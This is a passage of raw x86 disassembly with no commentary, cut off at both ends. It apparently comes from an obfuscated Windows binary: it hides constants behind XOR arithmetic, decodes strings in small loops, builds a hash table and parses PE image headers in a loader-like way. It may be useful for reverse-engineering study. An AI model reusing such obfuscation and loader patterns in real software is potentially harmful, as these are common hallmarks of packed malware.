  41fe7e:	mov    DWORD PTR [ebp-0x1c],edx
  41fe81:	mov    DWORD PTR [ebp-0x8],edi
  41fe84:	cmp    edi,ebx
  41fe86:	ja     0x41fe8b
  41fe88:	mov    DWORD PTR [ebp-0x8],ebx
  41fe8b:	xor    ebx,ebx
  41fe8d:	mov    DWORD PTR [ebp-0x18],ebx
  41fe90:	cmp    DWORD PTR [ebp-0x8],ebx
  41fe93:	jbe    0x41ff03
  41fe95:	jmp    0x41fe9a
  41fe97:	mov    edx,DWORD PTR [ebp-0x1c]
  41fe9a:	mov    edi,DWORD PTR [ebp-0x20]
  41fe9d:	movzx  edi,WORD PTR [edi+ebx*2]
  41fea1:	cmp    ebx,DWORD PTR [esi+0x18]
  41fea4:	jae    0x41ff03
  41fea6:	cmp    edi,DWORD PTR [esi+0x14]
  41fea9:	jae    0x41ff03
  41feab:	mov    ebx,DWORD PTR [edx+ebx*4]
  41feae:	mov    edx,DWORD PTR [ebp+0x8]
  41feb1:	mov    edi,DWORD PTR [ecx+edi*4]
  41feb4:	mov    DWORD PTR [ebp-0x4],edx
  41feb7:	lea    edx,[ebp-0x50]
  41feba:	add    ebx,eax
  41febc:	add    edi,eax
  41febe:	sub    edx,DWORD PTR [ebp+0x8]
  41fec1:	mov    DWORD PTR [ebp-0x14],0xb
  41fec8:	mov    DWORD PTR [ebp-0x24],edx
  41fecb:	mov    edx,DWORD PTR [ebp-0x4]
  41fece:	cmp    DWORD PTR [edx],0x0
  41fed1:	jne    0x41feee
  41fed3:	mov    eax,DWORD PTR [ebp-0x24]
  41fed6:	push   DWORD PTR [eax+edx*1]
  41fed9:	push   ebx
  41feda:	call   0x41fcd4
  41fedf:	mov    ecx,DWORD PTR [ebp-0xc]
  41fee2:	test   eax,eax
  41fee4:	je     0x41feeb
  41fee6:	mov    eax,DWORD PTR [ebp-0x4]
  41fee9:	mov    DWORD PTR [eax],edi
  41feeb:	mov    eax,DWORD PTR [ebp-0x10]
  41feee:	add    DWORD PTR [ebp-0x4],0x4
  41fef2:	dec    DWORD PTR [ebp-0x14]
  41fef5:	jne    0x41fecb
  41fef7:	mov    ebx,DWORD PTR [ebp-0x18]
  41fefa:	inc    ebx
  41fefb:	mov    DWORD PTR [ebp-0x18],ebx
  41fefe:	cmp    ebx,DWORD PTR [ebp-0x8]
  41ff01:	jb     0x41fe97
  41ff03:	pop    esi
  41ff04:	pop    ebx
  41ff05:	pop    edi
  41ff06:	leave  
  41ff07:	ret    0x4
  41ff0a:	push   ebp
  41ff0b:	mov    ebp,esp
  41ff0d:	mov    eax,DWORD PTR [ebp+0x8]
  41ff10:	push   esi
  41ff11:	push   DWORD PTR [eax+0x1d8]
  41ff17:	lea    esi,[eax+0x198]
  41ff1d:	mov    eax,DWORD PTR [ebp+0x8]
  41ff20:	call   0x41fdb9
  41ff25:	mov    ecx,DWORD PTR [esi]
  41ff27:	mov    DWORD PTR [ecx],eax
  41ff29:	mov    eax,DWORD PTR [esi]
  41ff2b:	xor    ecx,ecx
  41ff2d:	cmp    DWORD PTR [eax],ecx
  41ff2f:	pop    esi
  41ff30:	setne  cl
  41ff33:	mov    eax,ecx
  41ff35:	pop    ebp
  41ff36:	ret    0x4
  41ff39:	mov    ecx,DWORD PTR [edi+0x188]
  41ff3f:	push   ebx
  41ff40:	jmp    0x41ff55
  41ff42:	xor    eax,0x8a8e
  41ff47:	add    eax,0x3b52
  41ff4c:	mov    WORD PTR [ecx],ax
  41ff4f:	add    ecx,0x2
  41ff52:	add    edx,0x2
  41ff55:	movzx  eax,WORD PTR [edx]
  41ff58:	mov    ebx,0x4e20
  41ff5d:	cmp    ax,bx
  41ff60:	jne    0x41ff42
  41ff62:	xor    eax,eax
  41ff64:	mov    WORD PTR [ecx],ax
  41ff67:	mov    eax,DWORD PTR [edi+0x188]
  41ff6d:	pop    ebx
  41ff6e:	ret    
  41ff6f:	push   edi
  41ff70:	mov    edi,eax
  41ff72:	mov    eax,DWORD PTR [esi+0x188]
  41ff78:	shl    edi,0x6
  41ff7b:	add    eax,edi
  41ff7d:	jmp    0x41ff89
  41ff7f:	xor    cl,0x75
  41ff82:	sub    cl,0x7
  41ff85:	mov    BYTE PTR [eax],cl
  41ff87:	inc    eax
  41ff88:	inc    edx
  41ff89:	mov    cl,BYTE PTR [edx]
  41ff8b:	cmp    cl,0x72
  41ff8e:	jne    0x41ff7f
  41ff90:	mov    BYTE PTR [eax],0x0
  41ff93:	mov    eax,DWORD PTR [esi+0x188]
  41ff99:	add    eax,edi
  41ff9b:	pop    edi
  41ff9c:	ret    
  41ff9d:	push   ebp
  41ff9e:	mov    ebp,esp
  41ffa0:	sub    esp,0x14
  41ffa3:	mov    DWORD PTR [ebp-0x10],0xf89c8581
  41ffaa:	mov    DWORD PTR [ebp-0x4],0xf89c8580
  41ffb1:	mov    eax,DWORD PTR [ebx]
  41ffb3:	mov    DWORD PTR [ebp-0x8],eax
  41ffb6:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41ffbd:	push   esi
  41ffbe:	push   edi
  41ffbf:	mov    DWORD PTR [ebp-0x14],0xead718a1
  41ffc6:	mov    edi,DWORD PTR [ebp-0x4]
  41ffc9:	mov    ecx,DWORD PTR [ebp-0x10]
  41ffcc:	mov    eax,0x751089d
  41ffd1:	xor    edi,eax
  41ffd3:	mov    edx,0x3272e4
  41ffd8:	xor    ecx,eax
  41ffda:	add    edi,edx
  41ffdc:	add    ecx,edx
  41ffde:	imul   edi,ecx
  41ffe1:	jmp    0x420029
  41ffe3:	mov    ecx,DWORD PTR [ebp-0x8]
  41ffe6:	mov    esi,DWORD PTR [ebp-0x4]
  41ffe9:	xor    ecx,eax
  41ffeb:	xor    esi,eax
  41ffed:	add    ecx,edx
  41ffef:	add    esi,edx
  41fff1:	test   esi,ecx
  41fff3:	mov    esi,DWORD PTR [ebp-0x8]
  41fff6:	mov    ecx,DWORD PTR [ebp-0x4]
  41fff9:	je     0x420010
  41fffb:	xor    ecx,eax
  41fffd:	xor    esi,eax
  41ffff:	add    ecx,edx
  420001:	add    esi,edx
  420003:	shr    esi,cl
  420005:	mov    ecx,DWORD PTR [ebp-0x14]
  420008:	xor    ecx,eax
  42000a:	add    ecx,edx
  42000c:	xor    esi,ecx
  42000e:	jmp    0x42001a
  420010:	xor    esi,eax
  420012:	xor    ecx,eax
  420014:	add    esi,edx
  420016:	add    ecx,edx
  420018:	shr    esi,cl
  42001a:	mov    DWORD PTR [ebp-0x8],esi
  42001d:	mov    ecx,DWORD PTR [ebp-0x4]
  420020:	xor    ecx,eax
  420022:	lea    edi,[edi+ecx*1+0x3272e4]
  420029:	mov    ecx,DWORD PTR [ebp-0xc]
  42002c:	mov    esi,DWORD PTR [ebp-0x4]
  42002f:	xor    esi,eax
  420031:	xor    ecx,eax
  420033:	sub    ecx,esi
  420035:	cmp    edi,ecx
  420037:	jbe    0x41ffe3
  420039:	mov    eax,DWORD PTR [ebp-0x8]
  42003c:	pop    edi
  42003d:	mov    DWORD PTR [ebx],eax
  42003f:	mov    eax,DWORD PTR [ebp-0x8]
  420042:	pop    esi
  420043:	leave  
  420044:	ret    
  420045:	push   ebp
  420046:	mov    ebp,esp
  420048:	sub    esp,0x38
  42004b:	push   ebx
  42004c:	mov    ebx,0xf89c8581
  420051:	mov    DWORD PTR [ebp-0x4],ebx
  420054:	lea    eax,[ebx-0x1]
  420057:	push   esi
  420058:	mov    DWORD PTR [ebp-0x24],eax
  42005b:	mov    ecx,DWORD PTR [ebp-0x4]
  42005e:	mov    edx,DWORD PTR [ebp+0x8]
  420061:	mov    esi,0x751089d
  420066:	push   edi
  420067:	xor    ecx,esi
  420069:	mov    edi,0x3272e4
  42006e:	add    ecx,edi
  420070:	cmp    edx,ecx
  420072:	je     0x4201d8
  420078:	mov    ecx,DWORD PTR [ebp-0x4]
  42007b:	mov    edx,DWORD PTR [ebp+0xc]
  42007e:	xor    ecx,esi
  420080:	add    ecx,edi
  420082:	cmp    edx,ecx
  420084:	je     0x4201d8
  42008a:	mov    ecx,DWORD PTR [ebp+0x10]
  42008d:	mov    DWORD PTR [ebp-0x14],ecx
  420090:	mov    ecx,DWORD PTR [ebp+0xc]
  420093:	mov    edx,DWORD PTR [ebp+0x8]
  420096:	mov    DWORD PTR [ebp-0x18],0xf89c8506
  42009d:	mov    DWORD PTR [ebp-0x1c],eax
  4200a0:	mov    DWORD PTR [ebp-0x10],ebx
  4200a3:	mov    DWORD PTR [ebp+0xc],eax
  4200a6:	mov    DWORD PTR [ebp+0x10],0xf89c8583
  4200ad:	mov    eax,DWORD PTR [ebp+0xc]
  4200b0:	xor    eax,esi
  4200b2:	mov    DWORD PTR [ebp-0x20],ecx
  4200b5:	sub    ecx,eax
  4200b7:	sub    ecx,edi
  4200b9:	mov    DWORD PTR [ebp+0x8],ecx
  4200bc:	mov    DWORD PTR [ebp-0xc],edx
  4200bf:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  4200c6:	jmp    0x4201c8
  4200cb:	mov    eax,DWORD PTR [ebp+0xc]
  4200ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4200d1:	xor    eax,esi
  4200d3:	xor    ecx,esi
  4200d5:	lea    ecx,[eax+ecx*1+0x64e5c8]
  4200dc:	mov    eax,DWORD PTR [ebp+0x8]
  4200df:	xor    edx,edx
  4200e1:	div    ecx
  4200e3:	mov    eax,DWORD PTR [ebp+0x10]
  4200e6:	mov    ecx,DWORD PTR [ebp+0xc]
  4200e9:	xor    eax,esi
  4200eb:	xor    ecx,esi
  4200ed:	sub    eax,ecx
  4200ef:	cmp    edx,eax
  4200f1:	jne    0x420187
  4200f7:	mov    eax,DWORD PTR [ebp+0x8]
  4200fa:	mov    ecx,DWORD PTR [ebp-0xc]
  4200fd:	mov    dl,BYTE PTR [eax+ecx*1]
  420100:	mov    eax,DWORD PTR [ebp-0x10]
  420103:	mov    ecx,DWORD PTR [ebp-0x8]
  420106:	xor    eax,esi
  420108:	xor    ecx,esi
  42010a:	add    eax,edi
  42010c:	add    ecx,edi
  42010e:	cmp    eax,ecx
  420110:	jae    0x420158
  420112:	lea    ecx,[eax-0x3272e4]
  420118:	mov    DWORD PTR [ebp-0x4],ecx
  42011b:	mov    ebx,DWORD PTR [ebp-0x4]
  42011e:	xor    ebx,esi
  420120:	add    ebx,0x7f55d8c3
  420126:	lea    ecx,[ebp+eax*4-0x38]
  42012a:	mov    DWORD PTR [ecx],ebx
  42012c:	mov    ebx,DWORD PTR [ecx]
  42012e:	cmp    ebx,0x244ecba2
  420134:	jbe    0x42013e
  420136:	add    DWORD PTR [ecx],0x405fc1d
  42013c:	jmp    0x420144
  42013e:	add    DWORD PTR [ecx],0xfdaf43e3
  420144:	mov    ecx,DWORD PTR [ebp-0x8]
  420147:	xor    ecx,esi
  420149:	inc    eax
  42014a:	inc    DWORD PTR [ebp-0x4]
  42014d:	add    ecx,edi
  42014f:	cmp    eax,ecx
  420151:	jb     0x42011b
  420153:	mov    ebx,0xf89c8581
  420158:	cmp    DWORD PTR [ebp-0x14],0x0
  42015c:	jne    0x420166
  42015e:	xor    dl,0x75
  420161:	sub    dl,0x7
  420164:	jmp    0x42017c
  420166:	mov    eax,DWORD PTR [ebp-0x18]
  420169:	xor    al,0x9d
  42016b:	mov    cl,0x1c
  42016d:	sub    cl,al
  42016f:	add    dl,cl
  420171:	mov    ecx,DWORD PTR [ebp-0x1c]
  420174:	xor    cl,0x9d
  420177:	sub    cl,0x1c
  42017a:	ror    dl,cl
  42017c:	xor    eax,eax
  42017e:	mov    eax,DWORD PTR [ebp+0x8]
  420181:	mov    ecx,DWORD PTR [ebp-0xc]
  420184:	mov    BYTE PTR [eax+ecx*1],dl
  420187:	mov    eax,DWORD PTR [ebp+0x8]
  42018a:	mov    ecx,DWORD PTR [ebp-0x10]
  42018d:	sub    eax,edi
  42018f:	xor    eax,esi
  420191:	cmp    eax,ecx
  420193:	jne    0x4201b6
  420195:	mov    eax,DWORD PTR [ebp+0x10]
  420198:	mov    ecx,DWORD PTR [ebp+0xc]
  42019b:	xor    eax,esi
  42019d:	xor    ecx,esi
  42019f:	sub    eax,ecx
  4201a1:	mov    ecx,DWORD PTR [ebp-0x20]
  4201a4:	sub    eax,edi
  4201a6:	xor    eax,esi
  4201a8:	mov    DWORD PTR [ebp+0x10],eax
  4201ab:	mov    eax,DWORD PTR [ebp+0xc]
  4201ae:	xor    eax,esi
  4201b0:	sub    ecx,eax
  4201b2:	sub    ecx,edi
  4201b4:	jmp    0x4201c5
  4201b6:	mov    eax,DWORD PTR [ebp+0xc]
  4201b9:	xor    eax,esi
  4201bb:	mov    ecx,0xffcd8d1c
  4201c0:	sub    ecx,eax
  4201c2:	add    ecx,DWORD PTR [ebp+0x8]
  4201c5:	mov    DWORD PTR [ebp+0x8],ecx
  4201c8:	mov    eax,DWORD PTR [ebp+0x10]
  4201cb:	cmp    eax,ebx
  4201cd:	jne    0x4200cb
  4201d3:	mov    eax,DWORD PTR [ebp-0x24]
  4201d6:	jmp    0x4201db
  4201d8:	mov    eax,DWORD PTR [ebp-0x4]
  4201db:	xor    eax,esi
  4201dd:	add    eax,edi
  4201df:	pop    edi
  4201e0:	pop    esi
  4201e1:	pop    ebx
  4201e2:	leave  
  4201e3:	ret    0xc
  4201e6:	push   ebp
  4201e7:	mov    ebp,esp
  4201e9:	sub    esp,0x420
  4201ef:	mov    DWORD PTR [ebp-0x14],0xf89c8581
  4201f6:	mov    DWORD PTR [ebp-0xc],0xf89c8580
  4201fd:	mov    DWORD PTR [ebp-0x18],0xf89c8681
  420204:	push   ebx
  420205:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  42020c:	mov    eax,DWORD PTR [ebp-0x14]
  42020f:	push   esi
  420210:	mov    esi,0x751089d
  420215:	push   edi
  420216:	xor    eax,esi
  420218:	mov    edi,0x3272e4
  42021d:	add    eax,edi
  42021f:	mov    DWORD PTR [ebp-0x8],eax
  420222:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  420229:	mov    DWORD PTR [ebp-0x4],0xead718a1
  420230:	mov    DWORD PTR [ebp-0x10],0x8
  420237:	mov    ecx,ecx
  420239:	mov    eax,DWORD PTR [ebp-0xc]
  42023c:	mov    ecx,DWORD PTR [ebp-0x14]
  42023f:	xor    eax,esi
  420241:	xor    ecx,esi
  420243:	add    eax,edi
  420245:	add    ecx,edi
  420247:	imul   eax,ecx
  42024a:	jmp    0x42027d
  42024c:	mov    eax,DWORD PTR [ebp-0x4]
  42024f:	sub    eax,edi
  420251:	xor    eax,esi
  420253:	mov    DWORD PTR [ebp-0x8],eax
  420256:	lea    ebx,[ebp-0x8]
  420259:	call   0x41ff9d
  42025e:	mov    DWORD PTR [ebp-0x8],eax
  420261:	mov    eax,DWORD PTR [ebp-0x8]
  420264:	mov    ecx,DWORD PTR [ebp-0x4]
  420267:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42026e:	mov    eax,DWORD PTR [ebp-0xc]
  420271:	mov    ecx,DWORD PTR [ebp-0x4]
  420274:	xor    eax,esi
  420276:	lea    eax,[eax+ecx*1+0x3272e4]
  42027d:	mov    DWORD PTR [ebp-0x4],eax
  420280:	mov    eax,DWORD PTR [ebp-0x18]
  420283:	mov    ecx,DWORD PTR [ebp-0xc]
  420286:	xor    ecx,esi
  420288:	xor    eax,esi
  42028a:	sub    eax,ecx
  42028c:	mov    ecx,DWORD PTR [ebp-0x4]
  42028f:	cmp    ecx,eax
  420291:	jbe    0x42024c
  420293:	mov    eax,DWORD PTR [ebp-0x1c]
  420296:	xor    eax,esi
  420298:	add    eax,edi
  42029a:	mov    DWORD PTR [ebp-0x8],eax
  42029d:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  4202a4:	mov    ebx,ebx
  4202a6:	jmp    0x420309
  4202a8:	mov    ecx,DWORD PTR [ebp-0x20]
  4202ab:	mov    eax,DWORD PTR [ebp-0x8]
  4202ae:	xor    ecx,esi
  4202b0:	add    ecx,edi
  4202b2:	shr    eax,cl
  4202b4:	mov    DWORD PTR [ebp-0x4],eax
  4202b7:	mov    eax,DWORD PTR [ebp+0x8]
  4202ba:	mov    cl,BYTE PTR [eax]
  4202bc:	mov    BYTE PTR [ebp+0xb],cl
  4202bf:	mov    cl,BYTE PTR [ebp+0xb]
  4202c2:	mov    edx,DWORD PTR [ebp-0x8]
  4202c5:	movzx  ecx,cl
  4202c8:	xor    ecx,edx
  4202ca:	mov    DWORD PTR [ebp+0x8],ecx
  4202cd:	mov    ecx,DWORD PTR [ebp-0x18]
  4202d0:	mov    edx,DWORD PTR [ebp+0x8]
  4202d3:	xor    ecx,esi
  4202d5:	add    ecx,edi
  4202d7:	and    ecx,edx
  4202d9:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  4202e0:	mov    edx,DWORD PTR [ebp-0x4]
  4202e3:	xor    ecx,edx
  4202e5:	mov    DWORD PTR [ebp-0x8],ecx
  4202e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4202eb:	xor    ecx,esi
  4202ed:	lea    eax,[eax+ecx*1+0x3272e4]
  4202f4:	mov    DWORD PTR [ebp+0x8],eax
  4202f7:	mov    eax,DWORD PTR [ebp-0xc]
  4202fa:	xor    eax,esi
  4202fc:	mov    ecx,0xffcd8d1c
  420301:	sub    ecx,eax
  420303:	add    ecx,DWORD PTR [ebp-0x10]
  420306:	mov    DWORD PTR [ebp-0x10],ecx
  420309:	mov    eax,DWORD PTR [ebp-0x14]
  42030c:	mov    ecx,DWORD PTR [ebp-0x10]
  42030f:	xor    eax,esi
  420311:	add    eax,edi
  420313:	cmp    ecx,eax
  420315:	jne    0x4202a8
  420317:	mov    eax,DWORD PTR [ebp-0x1c]
  42031a:	mov    ecx,DWORD PTR [ebp-0x8]
  42031d:	xor    eax,esi
  42031f:	add    eax,edi
  420321:	pop    edi
  420322:	pop    esi
  420323:	xor    eax,ecx
  420325:	pop    ebx
  420326:	leave  
  420327:	ret    0x4
  42032a:	push   ebp
  42032b:	mov    ebp,esp
  42032d:	mov    eax,DWORD PTR [ebp+0x1c]
  420330:	mov    ecx,DWORD PTR [ebp+0x8]
  420333:	mov    edx,DWORD PTR [ebp+0x10]
  420336:	mov    eax,DWORD PTR [eax+0x190]
  42033c:	mov    eax,DWORD PTR [eax]
  42033e:	sub    esp,0x64
  420341:	push   ebx
  420342:	push   esi
  420343:	push   edi
  420344:	mov    edi,0x751089d
  420349:	xor    ecx,edi
  42034b:	mov    ebx,0x3272e4
  420350:	add    ecx,ebx
  420352:	cmp    ecx,edx
  420354:	jne    0x420365
  420356:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  420360:	jmp    0x420861
  420365:	mov    ecx,DWORD PTR [ebp+0x8]
  420368:	mov    esi,DWORD PTR [ebp+0x14]
  42036b:	mov    edx,DWORD PTR [esi]
  42036d:	xor    ecx,edi
  42036f:	add    ecx,ebx
  420371:	cmp    edx,ecx
  420373:	je     0x42081c
  420379:	mov    ecx,DWORD PTR [ebp+0x1c]
  42037c:	mov    DWORD PTR [ebp-0x1c],eax
  42037f:	mov    DWORD PTR [ebp+0x1c],ecx
  420382:	mov    ecx,DWORD PTR [ebp+0x18]
  420385:	mov    eax,DWORD PTR [esi]
  420387:	mov    DWORD PTR [ebp-0x20],eax
  42038a:	mov    DWORD PTR [ebp+0x8],0xf89c8581
  420391:	mov    edx,0xf89c8580
  420396:	mov    DWORD PTR [ebp-0x8],edx
  420399:	mov    eax,DWORD PTR [ebp+0x1c]
  42039c:	mov    DWORD PTR [ebp+0x1c],eax
  42039f:	mov    eax,DWORD PTR [ebp+0x1c]
  4203a2:	mov    eax,DWORD PTR [eax+0x190]
  4203a8:	mov    eax,DWORD PTR [eax]
  4203aa:	mov    DWORD PTR [ebp-0x24],ecx
  4203ad:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203b0:	mov    ecx,DWORD PTR [ecx+0x190]
  4203b6:	mov    ecx,DWORD PTR [ecx]
  4203b8:	add    ecx,DWORD PTR [eax+0x3c]
  4203bb:	mov    DWORD PTR [ebp+0x10],ecx
  4203be:	mov    eax,DWORD PTR [ebp+0x8]
  4203c1:	xor    eax,edi
  4203c3:	add    eax,ebx
  4203c5:	mov    DWORD PTR [ebp-0x4],eax
  4203c8:	mov    eax,DWORD PTR [ebp+0x8]
  4203cb:	xor    eax,edi
  4203cd:	add    eax,ebx
  4203cf:	mov    DWORD PTR [ebp+0x18],eax
  4203d2:	mov    eax,DWORD PTR [ebp+0x10]
  4203d5:	mov    eax,DWORD PTR [eax+0x50]
  4203d8:	sub    eax,0xc
  4203db:	mov    DWORD PTR [ebp-0x28],eax
  4203de:	mov    eax,DWORD PTR [ebp+0x10]
  4203e1:	mov    eax,DWORD PTR [eax+0x38]
  4203e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4203e7:	dec    eax
  4203e8:	test   DWORD PTR [ecx+0x54],eax
  4203eb:	mov    eax,DWORD PTR [ebp+0x10]
  4203ee:	je     0x420408
  4203f0:	mov    eax,DWORD PTR [eax+0x38]
  4203f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4203f6:	mov    ecx,DWORD PTR [ecx+0x54]
  4203f9:	dec    eax
  4203fa:	not    eax
  4203fc:	and    ecx,eax
  4203fe:	mov    eax,DWORD PTR [ebp+0x10]
  420401:	mov    eax,DWORD PTR [eax+0x38]
  420404:	add    eax,ecx
  420406:	jmp    0x42040b
  420408:	mov    eax,DWORD PTR [eax+0x54]
  42040b:	mov    DWORD PTR [ebp+0x1c],eax
  42040e:	mov    eax,DWORD PTR [ebp+0x8]
  420411:	xor    eax,edi
  420413:	add    eax,ebx
  420415:	mov    DWORD PTR [ebp+0x18],eax
  420418:	mov    eax,DWORD PTR [ebp+0x8]
  42041b:	xor    eax,edi
  42041d:	add    eax,ebx
  42041f:	mov    DWORD PTR [ebp+0x18],eax
  420422:	mov    eax,DWORD PTR [ebp+0x8]
  420425:	mov    ecx,DWORD PTR [ebp-0x24]
  420428:	xor    eax,edi
  42042a:	add    eax,ebx
  42042c:	mov    DWORD PTR [ecx],eax
  42042e:	mov    DWORD PTR [ebp+0x18],edx
  420431:	mov    DWORD PTR [ebp+0x18],0xf89c8583
  420438:	mov    DWORD PTR [ebp+0x18],0xf89c8582
  42043f:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  420446:	mov    eax,DWORD PTR [ebp-0x8]
  420449:	mov    ecx,DWORD PTR [ebp+0x1c]
  42044c:	xor    eax,edi
  42044e:	add    eax,ebx
  420450:	imul   eax,ecx
  420453:	mov    ecx,DWORD PTR [ebp+0x8]
  420456:	mov    edx,DWORD PTR [ebp-0x28]
  420459:	xor    ecx,edi
  42045b:	lea    ecx,[ecx+edx*1+0x3272e4]
  420462:	cmp    eax,ecx
  420464:	jae    0x420815
  42046a:	mov    eax,DWORD PTR [ebp+0x8]
  42046d:	xor    eax,edi
  42046f:	add    eax,ebx
  420471:	mov    DWORD PTR [ebp+0x18],eax
  420474:	mov    eax,DWORD PTR [ebp+0x1c]
  420477:	add    eax,DWORD PTR [ebp-0x1c]
  42047a:	mov    DWORD PTR [ebp-0x4],eax
  42047d:	push   DWORD PTR [ebp-0x4]
  420480:	mov    esi,DWORD PTR [ebp-0x1c]
  420483:	mov    ecx,DWORD PTR [ebp+0x10]
  420486:	call   0x41f5d5
  42048b:	mov    DWORD PTR [ebp+0xc],eax
  42048e:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  420495:	mov    eax,DWORD PTR [ebp-0x18]
  420498:	xor    eax,edi
  42049a:	lea    ecx,[ebp-0x40]
  42049d:	add    eax,ebx
  42049f:	push   ecx
  4204a0:	call   0x41fb69
  4204a5:	mov    eax,DWORD PTR [ebp+0xc]
  4204a8:	test   eax,eax
  4204aa:	je     0x4204fa
  4204ac:	mov    eax,DWORD PTR [ebp-0x18]
  4204af:	xor    eax,edi
  4204b1:	add    eax,ebx
  4204b3:	push   eax
  4204b4:	push   DWORD PTR [ebp+0xc]
  4204b7:	lea    eax,[ebp-0x40]
  4204ba:	push   eax
  4204bb:	call   0x41fa5f
  4204c0:	mov    eax,DWORD PTR [ebp-0x4]
  4204c3:	mov    DWORD PTR [ebp-0x18],eax
  4204c6:	mov    eax,DWORD PTR [ebp-0x18]
  4204c9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4204cc:	sub    eax,ecx
  4204ce:	mov    DWORD PTR [ebp-0x18],eax
  4204d1:	mov    eax,DWORD PTR [ebp+0xc]
  4204d4:	mov    ecx,DWORD PTR [ebp+0xc]
  4204d7:	mov    eax,DWORD PTR [eax+0x10]
  4204da:	add    eax,DWORD PTR [ecx+0xc]
  4204dd:	mov    ecx,DWORD PTR [ebp-0x18]
  4204e0:	cmp    ecx,eax
  4204e2:	jb     0x4204fa
  4204e4:	mov    eax,DWORD PTR [ebp+0xc]
  4204e7:	mov    eax,DWORD PTR [eax+0xc]
  4204ea:	mov    ecx,DWORD PTR [ebp+0xc]
  4204ed:	add    eax,DWORD PTR [ecx+0x8]
  4204f0:	mov    ecx,DWORD PTR [ebp-0x18]
  4204f3:	sub    eax,ecx
  4204f5:	jmp    0x4207e8
  4204fa:	push   0xc
  4204fc:	push   DWORD PTR [ebp-0x4]
  4204ff:	lea    eax,[ebp-0x4c]
  420502:	push   eax
  420503:	call   0x41fa5f
  420508:	mov    eax,0xf89c8581
  42050d:	mov    DWORD PTR [ebp-0x2c],eax
  420510:	mov    DWORD PTR [ebp-0x30],0xf89c8580
  420517:	mov    DWORD PTR [ebp-0x34],0xf89c8583
  42051e:	mov    DWORD PTR [ebp-0x38],0xf89c8582
  420525:	lea    ecx,[ebp-0x2c]
  420528:	mov    DWORD PTR [ebp-0xc],ecx
  42052b:	lea    ecx,[ebp-0x30]
  42052e:	mov    DWORD PTR [ebp-0x10],ecx
  420531:	lea    ecx,[ebp-0x34]
  420534:	mov    DWORD PTR [ebp+0xc],ecx
  420537:	lea    ecx,[ebp-0x38]
  42053a:	mov    DWORD PTR [ebp-0x14],ecx
  42053d:	mov    ecx,DWORD PTR [ebp+0x8]
  420540:	xor    ecx,edi
  420542:	add    ecx,ebx
  420544:	mov    DWORD PTR [ebp-0x18],ecx
  420547:	jmp    0x420743
  42054c:	cmp    eax,0xf89c8583
  420551:	je     0x420755
  420557:	mov    ecx,DWORD PTR [ebp-0x8]
  42055a:	xor    ecx,edi
  42055c:	mov    esi,eax
  42055e:	add    ecx,ebx
  420560:	mov    DWORD PTR [ebp+0x18],ecx
  420563:	mov    eax,DWORD PTR [ebp-0x18]
  420566:	xor    esi,edi
  420568:	lea    eax,[eax+esi*1+0x3272e4]
  42056f:	mov    DWORD PTR [ebp-0x18],eax
  420572:	mov    eax,DWORD PTR [ebp-0x8]
  420575:	mov    ecx,DWORD PTR [ebp-0x18]
  420578:	xor    eax,edi
  42057a:	add    eax,ebx
  42057c:	cmp    ecx,eax
  42057e:	jne    0x420593
  420580:	mov    eax,DWORD PTR [ebp+0x8]
  420583:	xor    eax,edi
  420585:	add    eax,ebx
  420587:	push   eax
  420588:	push   0xc
  42058a:	lea    eax,[ebp-0x4c]
  42058d:	push   eax
  42058e:	call   0x420045
  420593:	mov    eax,DWORD PTR [ebp-0xc]
  420596:	mov    eax,DWORD PTR [eax]
  420598:	xor    eax,edi
  42059a:	mov    al,BYTE PTR [ebp+eax*1+0x327298]
  4205a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4205a4:	xor    ecx,edi
  4205a6:	movzx  eax,al
  4205a9:	add    ecx,ebx
  4205ab:	cmp    eax,ecx
  4205ad:	je     0x42072b
  4205b3:	mov    eax,DWORD PTR [ebp-0x10]
  4205b6:	mov    eax,DWORD PTR [eax]
  4205b8:	xor    eax,edi
  4205ba:	mov    al,BYTE PTR [ebp+eax*1+0x327298]
  4205c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4205c4:	xor    ecx,edi
  4205c6:	movzx  eax,al
  4205c9:	add    ecx,ebx
  4205cb:	cmp    eax,ecx
  4205cd:	je     0x42072b
  4205d3:	mov    eax,DWORD PTR [ebp+0xc]
  4205d6:	mov    eax,DWORD PTR [eax]
  4205d8:	xor    eax,edi
  4205da:	mov    al,BYTE PTR [ebp+eax*1+0x327298]
  4205e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4205e4:	xor    ecx,edi
  4205e6:	movzx  eax,al
  4205e9:	add    ecx,ebx
  4205eb:	cmp    eax,ecx
  4205ed:	je     0x42072b
  4205f3:	mov    eax,DWORD PTR [ebp-0x14]
  4205f6:	mov    eax,DWORD PTR [eax]
  4205f8:	xor    eax,edi
  4205fa:	mov    al,BYTE PTR [ebp+eax*1+0x327298]
  420601:	mov    ecx,DWORD PTR [ebp+0x8]
  420604:	xor    ecx,edi
  420606:	movzx  eax,al
  420609:	add    ecx,ebx
  42060b:	cmp    eax,ecx
  42060d:	je     0x42072b
  420613:	mov    eax,DWORD PTR [ebp-0x10]
  420616:	mov    eax,DWORD PTR [eax]
  420618:	xor    eax,edi
  42061a:	mov    al,BYTE PTR [ebp+eax*1+0x327298]
  420621:	mov    ecx,DWORD PTR [ebp-0xc]
  420624:	mov    ecx,DWORD PTR [ecx]
  420626:	xor    ecx,edi
  420628:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  42062f:	xor    al,cl
  420631:	mov    ecx,DWORD PTR [ebp+0xc]
  420634:	mov    ecx,DWORD PTR [ecx]
  420636:	xor    ecx,edi
  420638:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  42063f:	or     al,cl
  420641:	mov    ecx,DWORD PTR [ebp-0xc]
  420644:	mov    ecx,DWORD PTR [ecx]
  420646:	xor    ecx,edi
